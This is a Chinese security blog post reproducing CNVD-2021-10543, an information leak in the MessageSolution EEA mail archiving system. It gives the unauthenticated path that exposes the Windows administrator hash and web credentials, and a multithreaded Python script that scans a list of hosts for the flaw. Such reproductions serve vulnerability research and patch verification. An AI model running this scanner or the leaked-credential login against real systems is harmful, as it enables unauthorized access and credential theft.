![v2-fbb90c38eb9329fc476b201ae9c5f996_1440w.png](https://image.3001.net/images/20210327/1616844437_605f16958d5c3b143bcc5.png!small)

MessageSolution 邮件归档系统EEA 信息泄露漏洞 CNVD-2021-10543复现

## 一、简介

MessageSolution企业邮件归档管理系统
EEA是北京易讯思达科技开发有限公司开发的一款邮件归档系统。该系统存在通用WEB信息泄漏，泄露Windows服务器administrator
hash与web账号密码

## 二、影响产品

MessageSolution 企业邮件归档管理系统EEA

## 三、漏洞复现

访问页面：

![v2-bbfc9c1433171067b587810c12ef88c9_1440w.png](https://image.3001.net/images/20210327/1616844438_605f16964295444242d2f.png!small)

存在漏洞poc路径：

    
    
    http://127.0.0.1/authenticationserverservlet/

访问地址出现密码：

![v2-d18ab9ad8253ee5d2e9baf4a01a5c3e4_1440w.png](https://image.3001.net/images/20210327/1616844438_605f1696dd6fb7a6907ea.png!small)![v2-30bda898f57c326e8bcd99f799e9b0e0_1440w.png](https://image.3001.net/images/20210327/1616844439_605f169745022e69c6837.png!small)

利用获取账户密码登陆系统：![v2-9518ef04d25b88e1324e75aacf58c0c1_1440w.png](https://image.3001.net/images/20210327/1616844439_605f1697e4fbb4afbe20c.png!small)

检测过程：

编写一个简单的检测脚本：

![1617082890_6062ba0a614f69f5b6c01.png!small?1617082890406](https://image.3001.net/images/20210330/1617082890_6062ba0a614f69f5b6c01.png!small?1617082890406)

脚本：

    
    
    #!/usr/bin/enc python
    # _*_ coding: utf-8 _*_
    
    import requests
    import os
    import sys
    import threading
    from multiprocessing.dummy import Pool
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    
    
    file = str(sys.argv[1])
    write = sys.argv[2]
    readfile = open(file , 'r' , encoding='UTF-8')
    writefile = open(write , 'a')
    ff = readfile.readlines()
    
    def webhttp():
        for line in ff:
            try:
                line = line.rstrip("\n")
                payload = "/authenticationserverservlet/"
                url = line + payload
                req = requests.get(url, verify=False, timeout=1)
                status = req.status_code
                print(req.text)
                if 'administrator' in req.text:
                    print(url+" -------------存在漏洞-------------")
                    writefile.write(url)
                    writefile.write('\n')
                else :
                    print(url+" 不存在漏洞")
                    pass
            except OSError:
                pass
    
    def main():
        #f = threading.Thread(target=webhttp)
        pool = Pool(50)
        f = pool.apply_async(func=webhttp)
        pool.close()
        pool.join()
        readfile.close()
        writefile.close()
    
    if __name__=="__main__":
        main()

参考：

<https://mp.weixin.qq.com/s/PQaOqCem2dhp3CijN5MdKg>

免责声明：本站提供安全工具、程序(方法)可能带有攻击性，仅供安全研究与教学之用，风险自负!

转载声明：著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。

订阅查看更多复现文章、学习笔记

thelostworld

安全路上，与你并肩前行！！！！![v2-ecdfe0b7f2dd19a1c854653de344b092_1440w.jpg](https://image.3001.net/images/20210327/1616844441_605f16990061a0e5d26a9.jpg!small)

个人知乎：<https://www.zhihu.com/people/fu-wei-43-69/columns>

个人简书：<https://www.jianshu.com/u/bf0e38a8d400>

个人CSDN：<https://blog.csdn.net/qq_37602797/category_10169006.html>

个人博客园：<https://www.cnblogs.com/thelostworld/>

FREEBUF主页：[https://www.freebuf.com/author/thelostworld?type=article](author/thelostworld?type=article)

语雀博客主页：<https://www.yuque.com/thelostworld>![v2-4b029825345899d23992b40ada6b2840_1440w.png](https://image.3001.net/images/20210327/1616844441_605f169966572fcc628f5.png!small)

欢迎添加本公众号作者微信交流，添加时备注一下“公众号”![v2-0d302ca3ab5381e8c1ab1065bf16271a_1440w.png](https://image.3001.net/images/20210327/1616844441_605f1699b774387a17fbd.png!small)

